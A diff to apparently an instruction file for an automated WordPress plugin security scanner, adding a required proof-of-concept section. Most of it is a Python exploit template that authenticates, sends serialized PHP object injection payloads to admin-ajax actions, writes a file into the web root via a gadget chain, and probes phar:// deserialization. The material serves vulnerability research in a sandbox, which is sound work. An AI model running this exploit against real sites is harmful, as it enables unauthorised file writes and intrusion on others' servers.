@@ -441,6 +441,257 @@ Object Injection without gadget: 4.0-6.0 (potential impact)
 
 ---
 
+## PoC Script Creation (REQUIRED)
+
+**When you find a vulnerability, you MUST create a standalone PoC script.**
+
+### File Location
+Save PoC to: `reports/{plugin_slug}/poc_object_injection_{short_id}.py`
+
+Example: `reports/gallery-pro/poc_object_injection_abc123.py`
+
+### PoC Template for Object Injection
+
+```python
+#!/usr/bin/env python3
+"""
+PoC for {Vulnerability Title}
+Plugin: {plugin_slug} v{version}
+Vulnerability: object_injection / phar_deserialization
+Auth Required: {auth_level}
+
+Usage:
+    python3 poc_object_injection.py --url http://target.com
+    python3 poc_object_injection.py --url http://target.com -u subscriber -p subscriber
+"""
+
+import argparse
+import requests
+import sys
+import re
+import base64
+
+def login(session, base_url, username, password):
+    """Authenticate to WordPress."""
+    login_url = f"{base_url}/wp-login.php"
+    data = {
+        "log": username,
+        "pwd": password,
+        "wp-submit": "Log In",
+        "redirect_to": f"{base_url}/wp-admin/",
+        "testcookie": "1"
+    }
+    resp = session.post(login_url, data=data, allow_redirects=True)
+    return "dashboard" in resp.text.lower() or resp.status_code == 200
+
+def get_nonce(session, base_url, nonce_action):
+    """Fetch WordPress nonce for AJAX action."""
+    resp = session.get(f"{base_url}/wp-admin/admin-ajax.php?action=get_nonce")
+    match = re.search(r'"nonce":"([a-f0-9]+)"', resp.text)
+    return match.group(1) if match else None
+
+def generate_payload(gadget_class, command="id"):
+    """
+    Generate serialized object injection payload.
+
+    Common gadget classes:
+    - Plugin-specific classes with dangerous __destruct/__wakeup
+    - Requests_Utility_FilteredIterator (WordPress)
+    - GuzzleHttp\\Psr7\\FnStream (if Guzzle present)
+    """
+    # === CUSTOMIZE THIS FOR THE SPECIFIC VULNERABILITY ===
+    # Example: Plugin has a class with dangerous __destruct
+    #
+    # class CacheHandler {
+    #     public $cache_file;
+    #     public $cache_data;
+    #     public function __destruct() {
+    #         file_put_contents($this->cache_file, $this->cache_data);
+    #     }
+    # }
+
+    # Payload to write PHP shell
+    payload = (
+        'O:12:"CacheHandler":2:{'
+        's:10:"cache_file";s:28:"/var/www/html/pwned_test.php";'
+        's:10:"cache_data";s:29:"<?php echo \'OBJECT_INJECTION_SUCCESS\'; ?>";'
+        '}'
+    )
+
+    return payload
+
+def test_direct_unserialize(base_url, session):
+    """Test for direct unserialize() with user input."""
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # Generate payload
+    payload = generate_payload("CacheHandler")
+
+    # Try direct serialized payload
+    data = {
+        'action': 'import_settings',
+        'data': payload
+    }
+    resp = session.post(target_url, data=data)
+
+    # Try base64 encoded (common pattern)
+    data_b64 = {
+        'action': 'import_settings',
+        'data': base64.b64encode(payload.encode()).decode()
+    }
+    resp_b64 = session.post(target_url, data=data_b64)
+
+    # Check if file was written (gadget executed)
+    check = session.get(f"{base_url}/pwned_test.php")
+    if "OBJECT_INJECTION_SUCCESS" in check.text:
+        return True, "Object injection successful - PHP file written via gadget chain"
+
+    return False, resp.text[:500]
+
+def test_phar_deserialization(base_url, session):
+    """Test for phar:// deserialization via file functions."""
+    # First, need to upload a phar file (disguised as image)
+    # This requires knowing a file upload endpoint
+
+    # Phar file with serialized payload in metadata
+    # For testing, we use a pre-generated minimal phar
+    # In real exploitation, generate with specific gadget chain
+
+    print("[!] Phar deserialization requires:")
+    print("    1. File upload capability (to upload .phar disguised as image)")
+    print("    2. File function called on user-controlled path (file_exists, getimagesize, etc.)")
+    print("    3. Gadget chain available in loaded classes")
+
+    # Test if phar:// wrapper triggers anything
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+    data = {
+        'action': 'check_file',
+        'path': 'phar://wp-content/uploads/test.jpg/test'
+    }
+    resp = session.post(target_url, data=data)
+
+    # Check for signs of phar processing
+    if 'cannot be used' not in resp.text.lower() and 'phar' not in resp.text.lower():
+        return True, "Potential phar deserialization - path accepted"
+
+    return False, "Phar wrapper blocked or not processed"
+
+def test_maybe_unserialize(base_url, session):
+    """Test for WordPress maybe_unserialize() vulnerabilities."""
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # WordPress auto-unserializes options and meta
+    # If we can control what gets stored, it may be unserialized later
+    payload = generate_payload("CacheHandler")
+
+    data = {
+        'action': 'save_option',
+        'option_value': payload  # Will be serialized again by WordPress, then unserialized on retrieval
+    }
+    resp = session.post(target_url, data=data)
+
+    # Trigger retrieval
+    data_get = {
+        'action': 'get_option'
+    }
+    resp_get = session.post(target_url, data=data_get)
+
+    # Check if gadget fired
+    check = session.get(f"{base_url}/pwned_test.php")
+    if "OBJECT_INJECTION_SUCCESS" in check.text:
+        return True, "maybe_unserialize() exploitation successful"
+
+    return False, resp.text[:500]
+
+def exploit(base_url, session=None):
+    """
+    Execute the object injection exploit.
+
+    Returns:
+        tuple: (vulnerable: bool, details: str)
+    """
+    s = session or requests.Session()
+
+    # Test direct unserialize
+    print("[*] Testing direct unserialize()...")
+    vuln, details = test_direct_unserialize(base_url, s)
+    if vuln:
+        return True, details
+
+    # Test maybe_unserialize
+    print("[*] Testing maybe_unserialize()...")
+    vuln, details = test_maybe_unserialize(base_url, s)
+    if vuln:
+        return True, details
+
+    # Test phar deserialization
+    print("[*] Testing phar:// deserialization...")
+    vuln, details = test_phar_deserialization(base_url, s)
+    if vuln:
+        return True, details
+
+    return False, "No object injection vulnerability found"
+
+def main():
+    parser = argparse.ArgumentParser(description="PoC for Object Injection vulnerability")
+    parser.add_argument("--url", "-t", required=True, help="Target WordPress URL")
+    parser.add_argument("--username", "-u", help="WordPress username (if auth required)")
+    parser.add_argument("--password", "-p", help="WordPress password (if auth required)")
+    parser.add_argument("--gadget", help="Gadget class to use in payload")
+    args = parser.parse_args()
+
+    base_url = args.url.rstrip("/")
+    session = requests.Session()
+
+    # Login if credentials provided
+    if args.username and args.password:
+        print(f"[*] Logging in as {args.username}...")
+        if not login(session, base_url, args.username, args.password):
+            print("[-] Login failed!")
+            sys.exit(1)
+        print("[+] Login successful!")
+
+    # Execute exploit
+    print(f"[*] Testing {base_url} for object injection...")
+    vulnerable, details = exploit(base_url, session)
+
+    if vulnerable:
+        print("[+] VULNERABLE!")
+        print(f"[+] Details: {details}")
+    else:
+        print("[-] Not vulnerable or exploit failed")
+        print(f"[-] Details: {details}")
+
+    return 0 if vulnerable else 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Required Structure
+Every PoC MUST have:
+1. **Argparse CLI** with `--url`, `-u/--username`, `-p/--password`
+2. **Login function** for authenticated vulnerabilities
+3. **Nonce fetching** if the endpoint requires it
+4. **Clear output** showing VULNERABLE or NOT VULNERABLE
+5. **Docstring** with plugin name, version, vuln type, auth level
+
+### PoC Checklist
+- [ ] Script runs with `python3 poc.py --help`
+- [ ] Script works against sandbox: `python3 poc.py --url http://172.17.0.1:8000`
+- [ ] For auth vulns: `python3 poc.py --url http://172.17.0.1:8000 -u subscriber -p subscriber`
+- [ ] Output clearly shows success/failure
+- [ ] No hardcoded URLs or credentials
+- [ ] Includes gadget chain construction
+- [ ] Documents which classes are used in the chain
+
+### After Creating PoC
+1. Test it against the sandbox
+2. Create finding with `wpguard_finding_create()`
+3. Include PoC path in finding's `poc_path` field
+
+---
+
 ## Signal Completion
 
 ```python
